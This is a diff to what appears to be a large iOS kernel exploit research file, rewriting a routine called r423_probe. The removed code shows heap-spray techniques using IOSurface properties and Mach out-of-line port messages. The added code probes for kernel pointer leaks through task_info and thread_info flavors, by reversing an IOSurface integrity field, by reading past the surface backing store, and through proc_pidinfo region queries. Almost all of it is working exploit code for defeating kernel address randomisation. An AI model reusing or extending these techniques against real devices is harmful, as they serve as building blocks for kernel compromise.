@@ -16573,11 +16573,90 @@ static void *r419_race_reader(void *arg) {
  */
 
 static void r423_probe(void) {
-    rlog("\n=== r423: Heap Kernel Pointer Leak ===\n\n");
+    rlog("\n=== r423: Kernel Info Leak Multi-Vector ===\n\n");
     fflush(stdout);
 
-    /* ---- Vector A: Property value corruption check ---- */
-    rlog("  Vector A: Property corruption via spray+free+realloc\n");
+    /* ---- Vector A: task_info all flavors ---- */
+    /* Try every task_info flavor 1-50 looking for kernel pointers. */
+    rlog("  Vector A: task_info flavor scan\n");
+    {
+        int kernelFound = 0;
+        for (int flavor = 1; flavor <= 50; flavor++) {
+            uint64_t buf[128];
+            memset(buf, 0, sizeof(buf));
+            mach_msg_type_number_t cnt = 128;
+            kern_return_t kr = task_info(mach_task_self(), flavor,
+                (task_info_t)buf, &cnt);
+            if (kr == KERN_SUCCESS && cnt > 0) {
+                for (mach_msg_type_number_t i = 0; i < cnt; i++) {
+                    uint64_t v = buf[i];
+                    if ((v >> 32) >= 0xFFFFFFF0ULL &&
+                        v != 0xFFFFFFFFFFFFFFFF) {
+                        rlog("    *** flavor=%d word[%u]: 0x%016llx KERNEL ***\n",
+                            flavor, i, (unsigned long long)v);
+                        kernelFound++;
+                    }
+                }
+                if (flavor <= 10 || kernelFound)
+                    rlog("    flavor=%d cnt=%u first=0x%016llx kr=0\n",
+                        flavor, cnt, (unsigned long long)buf[0]);
+            }
+        }
+        if (!kernelFound)
+            rlog("    No kernel pointers in any task_info flavor\n");
+    }
+    fflush(stdout);
+
+    /* ---- Vector B: thread_info all flavors ---- */
+    rlog("\n  Vector B: thread_info flavor scan\n");
+    {
+        thread_array_t threads;
+        mach_msg_type_number_t threadCount;
+        kern_return_t kr = task_threads(mach_task_self(), &threads,
+            &threadCount);
+        if (kr == KERN_SUCCESS && threadCount > 0) {
+            rlog("    Thread count: %u\n", threadCount);
+            int kernelFound = 0;
+            for (int flavor = 1; flavor <= 20; flavor++) {
+                uint64_t buf[128];
+                memset(buf, 0, sizeof(buf));
+                mach_msg_type_number_t cnt = 128;
+                kr = thread_info(threads[0], flavor,
+                    (thread_info_t)buf, &cnt);
+                if (kr == KERN_SUCCESS && cnt > 0) {
+                    for (mach_msg_type_number_t i = 0; i < cnt; i++) {
+                        uint64_t v = buf[i];
+                        if ((v >> 32) >= 0xFFFFFFF0ULL &&
+                            v != 0xFFFFFFFFFFFFFFFF) {
+                            rlog("    *** flavor=%d word[%u]: 0x%016llx KERNEL ***\n",
+                                flavor, i, (unsigned long long)v);
+                            kernelFound++;
+                        }
+                    }
+                }
+            }
+            if (!kernelFound)
+                rlog("    No kernel pointers in any thread_info flavor\n");
+            for (mach_msg_type_number_t i = 0; i < threadCount; i++)
+                mach_port_deallocate(mach_task_self(), threads[i]);
+            vm_deallocate(mach_task_self(), (vm_address_t)threads,
+                threadCount * sizeof(thread_t));
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Vector C: IOSurface shared data structure deep scan ---- */
+    /* The IOSurfaceClientRef at +8 has a pointer to shared data.
+       That shared data contains an integrity check at +88 which is
+       ~(shared_addr + 0x28). If we can find the KERNEL address of this
+       shared data, we have a kernel heap pointer.
+
+       Strategy: The integrity check at +88 is ~(shared_addr + 0x28).
+       We know the userspace shared_addr. If the kernel maps this at a
+       DIFFERENT address, the integrity check would encode the kernel
+       address. Let's check if integrity == ~(user_addr + 0x28). If not,
+       the difference reveals the kernel mapping address. */
+    rlog("\n  Vector C: IOSurface shared data integrity check analysis\n");
     {
         unsigned pixFmt = 'BGRA';
         const void *kk[] = {
@@ -16598,102 +16677,67 @@ static void r423_probe(void) {
             &kCFTypeDictionaryKeyCallBacks,
             &kCFTypeDictionaryValueCallBacks);
 
-        /* Create surface and spray 200 properties of size ~128 bytes */
-        IOSurfaceRef surf = IOSurfaceCreate(sprops);
-        rlog("    Surface created: id=%u\n", IOSurfaceGetID(surf));
+        for (int trial = 0; trial < 5; trial++) {
+            IOSurfaceRef surf = IOSurfaceCreate(sprops);
+            uint32_t sid = IOSurfaceGetID(surf);
 
-        /* Fill properties with known pattern */
-        uint8_t propData[128];
-        memset(propData, 0x41, sizeof(propData));
-        CFDataRef dataVal = CFDataCreate(NULL, propData, sizeof(propData));
+            /* Get the shared pointer from IOSurfaceClientRef +8 */
+            uint64_t clientRef = (uint64_t)surf;
+            uint64_t sharedPtr;
+            memcpy(&sharedPtr, (void *)(clientRef + 8), 8);
 
-        for (int i = 0; i < 200; i++) {
-            char keyStr[32];
-            snprintf(keyStr, sizeof(keyStr), "spray_%d", i);
-            CFStringRef key = CFStringCreateWithCString(NULL, keyStr,
-                kCFStringEncodingASCII);
-            IOSurfaceSetValue(surf, key, dataVal);
-            CFRelease(key);
-        }
-        rlog("    Sprayed 200 properties (128 bytes each)\n");
+            if (sharedPtr) {
+                /* Read integrity check at shared+88 */
+                uint64_t integrityVal;
+                memcpy(&integrityVal, (void *)(sharedPtr + 88), 8);
 
-        /* Remove every other one to create holes in kalloc.128 */
-        for (int i = 0; i < 200; i += 2) {
-            char keyStr[32];
-            snprintf(keyStr, sizeof(keyStr), "spray_%d", i);
-            CFStringRef key = CFStringCreateWithCString(NULL, keyStr,
-                kCFStringEncodingASCII);
-            IOSurfaceRemoveValue(surf, key);
-            CFRelease(key);
-        }
-        rlog("    Freed 100 property holes\n");
+                /* What we EXPECT if shared data is at same address: */
+                uint64_t expectedIntegrity = ~(sharedPtr + 0x28);
 
-        /* Trigger kernel allocations into the holes:
-           Create Mach ports (ipc_port is ~128 bytes on some versions) */
-        mach_port_t fillerPorts[100];
-        for (int i = 0; i < 100; i++) {
-            mach_port_allocate(mach_task_self(),
-                MACH_PORT_RIGHT_RECEIVE, &fillerPorts[i]);
-            mach_port_insert_right(mach_task_self(), fillerPorts[i],
-                fillerPorts[i], MACH_MSG_TYPE_MAKE_SEND);
-        }
-        rlog("    Allocated 100 Mach ports into holes\n");
+                rlog("    Surface %u: shared=0x%llx\n",
+                    sid, (unsigned long long)sharedPtr);
+                rlog("      integrity@+88 = 0x%016llx\n",
+                    (unsigned long long)integrityVal);
+                rlog("      expected      = 0x%016llx\n",
+                    (unsigned long long)expectedIntegrity);
 
-        /* Read back remaining properties, check for corruption */
-        int kernelFound = 0;
-        for (int i = 1; i < 200; i += 2) {
-            char keyStr[32];
-            snprintf(keyStr, sizeof(keyStr), "spray_%d", i);
-            CFStringRef key = CFStringCreateWithCString(NULL, keyStr,
-                kCFStringEncodingASCII);
-            CFDataRef val = (CFDataRef)IOSurfaceCopyValue(surf, key);
-            if (val) {
-                if (CFGetTypeID(val) == CFDataGetTypeID()) {
-                    const uint8_t *bytes = CFDataGetBytePtr(val);
-                    CFIndex len = CFDataGetLength(val);
-                    /* Check if any 8-byte aligned value looks like kernel ptr */
-                    for (CFIndex off = 0; off + 7 < len; off += 8) {
-                        uint64_t v;
-                        memcpy(&v, bytes + off, 8);
-                        if ((v >> 32) >= 0xFFFFFFF0ULL &&
-                            v != 0xFFFFFFFFFFFFFFFF &&
-                            v != 0x4141414141414141ULL) {
-                            rlog("    *** spray_%d +%lld: 0x%016llx KERNEL ***\n",
-                                i, (long long)off, (unsigned long long)v);
-                            kernelFound++;
-                        }
-                    }
-                    /* Also check if data is no longer our pattern */
-                    if (len >= 8) {
-                        uint64_t first;
-                        memcpy(&first, bytes, 8);
-                        if (first != 0x4141414141414141ULL) {
-                            rlog("    spray_%d corrupted! first=0x%016llx\n",
-                                i, (unsigned long long)first);
-                        }
+                if (integrityVal != expectedIntegrity) {
+                    /* The integrity was computed with a DIFFERENT address!
+                       Solve: integrity == ~(kernel_addr + 0x28)
+                       kernel_addr = ~integrity - 0x28 */
+                    uint64_t kernelAddr = ~integrityVal - 0x28;
+                    rlog("      *** MISMATCH! kernel_shared=0x%016llx ***\n",
+                        (unsigned long long)kernelAddr);
+                } else {
+                    rlog("      Match (same address in user+kernel)\n");
+                }
+
+                /* Also dump first 160 bytes of shared data for analysis */
+                rlog("      Shared data dump:\n");
+                for (int off = 0; off < 160; off += 8) {
+                    uint64_t v;
+                    memcpy(&v, (void *)(sharedPtr + off), 8);
+                    if (v != 0) {
+                        rlog("        +%3d: 0x%016llx", off,
+                            (unsigned long long)v);
+                        if ((v >> 32) >= 0xFFFFFFF0ULL)
+                            rlog(" *** KERNEL ***");
+                        rlog("\n");
                     }
                 }
-                CFRelease(val);
             }
-            CFRelease(key);
+            CFRelease(surf);
         }
-        if (!kernelFound)
-            rlog("    No kernel pointers found in properties\n");
-
-        /* Clean up */
-        for (int i = 0; i < 100; i++)
-            mach_port_deallocate(mach_task_self(), fillerPorts[i]);
-        CFRelease(surf);
         CFRelease(sprops);
-        CFRelease(dataVal);
         for (int i = 0; i < 5; i++) CFRelease(vv[i]);
     }
     fflush(stdout);
 
-    /* ---- Vector B: OOL port spray + property read ---- */
-    rlog("\n  Vector B: OOL port spray via Mach messages\n");
+    /* ---- Vector D: IOSurface backing store boundary scan ---- */
+    /* Map a surface, write a known pattern, then read beyond alloc size
+       using our redirect primitive to see if adjacent kernel data leaks */
+    rlog("\n  Vector D: IOSurface lock/base address analysis\n");
     {
-        /* Create a surface with property spray at 256 bytes */
         unsigned pixFmt = 'BGRA';
         const void *kk[] = {
             kIOSurfaceWidth, kIOSurfaceHeight,
@@ -16714,109 +16758,121 @@ static void r423_probe(void) {
             &kCFTypeDictionaryValueCallBacks);
 
         IOSurfaceRef surf = IOSurfaceCreate(sprops);
+        IOSurfaceLock(surf, 0, NULL);
+        void *base = IOSurfaceGetBaseAddress(surf);
+        size_t allocSz = IOSurfaceGetAllocSize(surf);
+        rlog("    base=%p allocSize=%zu\n", base, allocSz);
 
-        /* Spray 100 properties of 256 bytes */
-        uint8_t propData[256];
-        memset(propData, 0x42, sizeof(propData));
-        CFDataRef dataVal = CFDataCreate(NULL, propData, sizeof(propData));
+        /* Check what's in memory AFTER the backing store.
+           On iOS, the surface backing store is a VM region.
+           Pages beyond our allocation may be accessible if they're
+           part of the same VM object. */
+        if (base) {
+            /* Fill with known pattern */
+            memset(base, 0xCC, allocSz);
 
-        for (int i = 0; i < 100; i++) {
-            char keyStr[32];
-            snprintf(keyStr, sizeof(keyStr), "ool_%d", i);
-            CFStringRef key = CFStringCreateWithCString(NULL, keyStr,
-                kCFStringEncodingASCII);
-            IOSurfaceSetValue(surf, key, dataVal);
-            CFRelease(key);
-        }
+            /* Try to read pages beyond our allocation */
+            volatile uint8_t *probe;
+            rlog("    Probing beyond backing store:\n");
 
-        /* Free even slots */
-        for (int i = 0; i < 100; i += 2) {
-            char keyStr[32];
-            snprintf(keyStr, sizeof(keyStr), "ool_%d", i);
-            CFStringRef key = CFStringCreateWithCString(NULL, keyStr,
-                kCFStringEncodingASCII);
-            IOSurfaceRemoveValue(surf, key);
-            CFRelease(key);
-        }
+            /* Set up signal handler for safe access */
+            struct sigaction oldAct, newAct;
+            memset(&newAct, 0, sizeof(newAct));
+            sigjmp_buf r423_jmp;
+            volatile int r423_faulted = 0;
+            newAct.sa_handler = r419_sighandler; /* reuse */
 
-        /* Send OOL Mach messages with port descriptors.
-           Each OOL port array contains kernel ipc_port* pointers. */
-        mach_port_t queuePort;
-        mach_port_allocate(mach_task_self(),
-            MACH_PORT_RIGHT_RECEIVE, &queuePort);
+            /* We'll do manual probing at page boundaries */
+            for (int pg = 0; pg <= 4; pg++) {
+                size_t off = allocSz + (pg * 16384);
+                probe = (volatile uint8_t *)base + off;
 
-        mach_port_t sendPorts[32];
-        for (int i = 0; i < 32; i++) {
-            mach_port_allocate(mach_task_self(),
-                MACH_PORT_RIGHT_RECEIVE, &sendPorts[i]);
-            mach_port_insert_right(mach_task_self(), sendPorts[i],
-                sendPorts[i], MACH_MSG_TYPE_MAKE_SEND);
-        }
-
-        /* Send messages with OOL ports */
-        for (int m = 0; m < 50; m++) {
-            struct {
-                mach_msg_header_t hdr;
-                mach_msg_body_t body;
-                mach_msg_ool_ports_descriptor_t ool;
-            } msg;
-            memset(&msg, 0, sizeof(msg));
-            msg.hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX |
-                MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
-            msg.hdr.msgh_size = sizeof(msg);
-            msg.hdr.msgh_remote_port = queuePort;
-            msg.hdr.msgh_local_port = MACH_PORT_NULL;
-            msg.body.msgh_descriptor_count = 1;
-            msg.ool.address = sendPorts;
-            msg.ool.count = 32;
-            msg.ool.deallocate = 0;
-            msg.ool.disposition = MACH_MSG_TYPE_COPY_SEND;
-            msg.ool.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
-
-            kern_return_t kr = mach_msg(&msg.hdr, MACH_SEND_MSG,
-                sizeof(msg), 0, MACH_PORT_NULL, 0, MACH_PORT_NULL);
-            if (kr != KERN_SUCCESS && m == 0)
-                rlog("    OOL send failed: kr=%d\n", kr);
-        }
-        rlog("    Sent 50 OOL port messages (32 ports each)\n");
-
-        /* Read back remaining properties */
-        int kernelFound = 0;
-        for (int i = 1; i < 100; i += 2) {
-            char keyStr[32];
-            snprintf(keyStr, sizeof(keyStr), "ool_%d", i);
-            CFStringRef key = CFStringCreateWithCString(NULL, keyStr,
-                kCFStringEncodingASCII);
-            CFDataRef val = (CFDataRef)IOSurfaceCopyValue(surf, key);
-            if (val && CFGetTypeID(val) == CFDataGetTypeID()) {
-                const uint8_t *bytes = CFDataGetBytePtr(val);
-                CFIndex len = CFDataGetLength(val);
-                for (CFIndex off = 0; off + 7 < len; off += 8) {
-                    uint64_t v;
-                    memcpy(&v, bytes + off, 8);
-                    if ((v >> 32) >= 0xFFFFFFF0ULL &&
-                        v != 0xFFFFFFFFFFFFFFFF &&
-                        v != 0x4242424242424242ULL) {
-                        rlog("    *** ool_%d +%lld: 0x%016llx KERNEL ***\n",
-                            i, (long long)off, (unsigned long long)v);
-                        kernelFound++;
+                /* Use vm_read to safely check without crashing */
+                vm_offset_t data = 0;
+                mach_msg_type_number_t dataCnt = 0;
+                kern_return_t kr = vm_read(mach_task_self(),
+                    (vm_address_t)probe, 64, &data, &dataCnt);
+                if (kr == KERN_SUCCESS && dataCnt >= 64) {
+                    uint64_t *ptr = (uint64_t *)data;
+                    rlog("      +%zu: readable! first=0x%016llx\n",
+                        off, (unsigned long long)ptr[0]);
+                    for (int w = 0; w < 8; w++) {
+                        if ((ptr[w] >> 32) >= 0xFFFFFFF0ULL &&
+                            ptr[w] != 0xFFFFFFFFFFFFFFFF &&
+                            ptr[w] != 0xCCCCCCCCCCCCCCCCULL) {
+                            rlog("      *** +%zu word[%d]: 0x%016llx KERNEL ***\n",
+                                off, w, (unsigned long long)ptr[w]);
+                        }
                     }
+                    vm_deallocate(mach_task_self(), data, dataCnt);
+                } else {
+                    rlog("      +%zu: not readable (kr=%d)\n", off, kr);
                 }
             }
-            if (val) CFRelease(val);
-            CFRelease(key);
         }
-        if (!kernelFound)
-            rlog("    No kernel pointers in OOL spray\n");
 
-        /* Clean up */
-        mach_port_destroy(mach_task_self(), queuePort);
-        for (int i = 0; i < 32; i++)
-            mach_port_deallocate(mach_task_self(), sendPorts[i]);
+        IOSurfaceUnlock(surf, 0, NULL);
         CFRelease(surf);
         CFRelease(sprops);
-        CFRelease(dataVal);
         for (int i = 0; i < 5; i++) CFRelease(vv[i]);
+    }
+    fflush(stdout);
+
+    /* ---- Vector E: proc_pidinfo PROC_PIDLISTFDS ---- */
+    rlog("\n  Vector E: proc_pidinfo fd list + region info\n");
+    {
+        pid_t pid = getpid();
+
+        /* List all file descriptors */
+        int bufSz = proc_pidinfo(pid, PROC_PIDLISTFDS, 0, NULL, 0);
+        rlog("    PROC_PIDLISTFDS bufsize=%d\n", bufSz);
+        if (bufSz > 0) {
+            struct proc_fdinfo *fds = malloc(bufSz);
+            int actual = proc_pidinfo(pid, PROC_PIDLISTFDS, 0,
+                fds, bufSz);
+            int nfds = actual / sizeof(struct proc_fdinfo);
+            rlog("    Got %d fds\n", nfds);
+            for (int i = 0; i < nfds && i < 20; i++) {
+                rlog("      fd=%d type=%d\n",
+                    fds[i].proc_fd, fds[i].proc_fdtype);
+            }
+            free(fds);
+        }
+
+        /* Try PROC_PIDREGIONPATHINFO2 (flavor 22) which may leak
+           kernel vm_map_entry pointers on some versions */
+        uint64_t addr = 0;
+        for (int attempt = 0; attempt < 5; attempt++) {
+            uint8_t regbuf[4096];
+            memset(regbuf, 0, sizeof(regbuf));
+            int ret = proc_pidinfo(pid, 22 /* PROC_PIDREGIONPATHINFO2 */,
+                addr, regbuf, sizeof(regbuf));
+            if (ret > 0) {
+                rlog("    PIDREGIONPATHINFO2 addr=0x%llx ret=%d\n",
+                    (unsigned long long)addr, ret);
+                /* Scan for kernel pointers */
+                for (int off = 0; off + 7 < ret; off += 8) {
+                    uint64_t v;
+                    memcpy(&v, regbuf + off, 8);
+                    if ((v >> 32) >= 0xFFFFFFF0ULL &&
+                        v != 0xFFFFFFFFFFFFFFFF) {
+                        rlog("    *** +%d: 0x%016llx KERNEL ***\n",
+                            off, (unsigned long long)v);
+                    }
+                }
+                /* Advance to next region */
+                uint64_t nextAddr;
+                memcpy(&nextAddr, regbuf, 8);
+                if (nextAddr > addr)
+                    addr = nextAddr;
+                else
+                    break;
+            } else {
+                rlog("    PIDREGIONPATHINFO2 failed at addr=0x%llx\n",
+                    (unsigned long long)addr);
+                break;
+            }
+        }
     }
     fflush(stdout);
 
